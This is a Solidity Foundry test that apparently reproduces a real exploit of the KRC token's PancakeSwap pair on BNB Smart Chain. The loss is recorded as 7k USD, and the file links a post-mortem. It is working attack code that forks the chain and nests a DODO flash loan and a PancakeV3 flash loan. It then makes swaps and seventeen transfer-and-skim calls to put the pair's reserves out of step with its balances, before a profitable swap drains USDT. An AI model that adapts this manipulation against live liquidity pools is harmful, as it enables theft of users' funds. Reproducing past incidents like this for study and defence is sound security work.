// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 7k USD
// Attacker : https://bscscan.com/address/0x9943f26831f9b468a7fe5ac531c352baab8af655
// Attack Contract : 0xd995edcab2efe3283514ff111cedc9aaff0349c8
// Vulnerable Contract : https://bscscan.com/address/0xdbead75d3610209a093af1d46d5296bbeffd53f5
// Attack Tx : https://bscscan.com/tx/0x78f242dee5b8e15a43d23d76bce827f39eb3ac54b44edcd327c5d63de3848daf

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xdbead75d3610209a093af1d46d5296bbeffd53f5#code

// @Analysis
// Post-mortem : https://x.com/OpenZeppelin/status/1953111764536561867
// Twitter Guy : https://x.com/CertikAIAgent/status/1924280794916536765
// Hacking God : N/A

contract KRC_Exploit is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 49875424 - 1;
    uint256 dodo_borrow_amount = 248157126634995412253694;

    // --- Contracts ---
    IERC20 usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 krcToken = IERC20(0x1814a8443F37dDd7930A9d8BC4b48353FE589b58);
    I0x6098_DPP_DODO dodo_private_pool = I0x6098_DPP_DODO(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IPancakeV3Pool pancake_v3_pool = IPancakeV3Pool(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    IUniswapV2Router router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IPancakePair krc_pair = IPancakePair(0xdBEAD75d3610209A093AF1D46d5296BBeFFd53f5);

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        fundingToken = address(usdt);
    }

    function testExploit() public balanceLog {
        // Step 1: Initial Flashloan from Dodo Private Pool
        dodo_private_pool.flashLoan(0, dodo_borrow_amount, address(this), new bytes(1));
    }

    // Step 2: Dodo Flashloan Callback
    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        // Step 3: Nested Flashloan from PancakeV3 Pool
        uint256 pcv3_flash_amount = 100000000000000000000000;
        pancake_v3_pool.flash(address(this), pcv3_flash_amount, 0, new bytes(1));

        // Step 10: Repay Dodo Flashloan at the very end
        usdt.transfer(address(dodo_private_pool), dodo_borrow_amount);
    }

    // Step 4: PancakeV3 Flashloan Callback (Core Exploit Logic)
    function pancakeV3FlashCallback(uint256, uint256, bytes memory) public {
        usdt.approve(address(router), type(uint256).max);

        uint256 deadline = 1747556507;
        address[] memory path = new address[](2);
        path[0] = address(usdt);
        path[1] = address(krcToken);

        // Step 5: First swap (USDT -> KRC) with a large amount to initiate the imbalance
        uint256 amountIn1 = 144116157450400259173940;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn1, 0, path, address(this), deadline);

        // Step 6: Second swap (USDT -> KRC) with the remaining balance
        uint256 amountIn2 = 204040969184595153079754; // Hardcoded from trace
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn2, 0, path, address(this), deadline);

        // Step 7: The core manipulation. A series of 17 precise transfers and skims
        // This desynchronizes the pair's cached reserves from its actual token balances.
        // The values are taken directly from the original attack transaction.
        krcToken.transfer(address(krc_pair), 26158607120271760914);
        krc_pair.skim(address(this));
        krcToken.transfer(address(krc_pair), 23542746408244584823);
        krc_pair.skim(address(this));
        krcToken.transfer(address(krc_pair), 21188471767420126341);
        krc_pair.skim(address(this));
        krcToken.transfer(address(krc_pair), 19069624590678113707);
        krc_pair.skim(address(this));
        krcToken.transfer(address(krc_pair), 17162662131610302337);
        krc_pair.skim(address(this));
        krcToken.transfer(address(krc_pair), 15446395918449272104);
        krc_pair.skim(address(this));
        krcToken.transfer(address(krc_pair), 13901756326604344894);
        krc_pair.skim(address(this));
        krcToken.transfer(address(krc_pair), 12511580693943910405);
        krc_pair.skim(address(this));
        krcToken.transfer(address(krc_pair), 11260422624549519365);
        krc_pair.skim(address(this));
        krcToken.transfer(address(krc_pair), 10134380362094567429);
        krc_pair.skim(address(this));
        krcToken.transfer(address(krc_pair), 9120942325885110687);
        krc_pair.skim(address(this));
        krcToken.transfer(address(krc_pair), 8208848093296599619);
        krc_pair.skim(address(this));
        krcToken.transfer(address(krc_pair), 7387963283966939658);
        krc_pair.skim(address(this));
        krcToken.transfer(address(krc_pair), 6649166955570245693);
        krc_pair.skim(address(this));
        krcToken.transfer(address(krc_pair), 5984250260013221124);
        krc_pair.skim(address(this));
        krcToken.transfer(address(krc_pair), 5385825234011899012);
        krc_pair.skim(address(this));
        krcToken.transfer(address(krc_pair), 2980897375759759211);
        
        // Step 8: The profitable swap, extracting a huge amount of USDT
        uint256 amountOutUSDT = 355361934507515425212391;
        krc_pair.swap(0, amountOutUSDT, address(this), new bytes(0));

        // Step 9: Repay the PancakeV3 flash loan with its fee
        uint256 pcv3_repay_amount = 100050000000000000000000;
        usdt.transfer(address(pancake_v3_pool), pcv3_repay_amount);
    }
}

interface I0x6098_DPP_DODO {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address _assetTo, bytes calldata data) external;
}
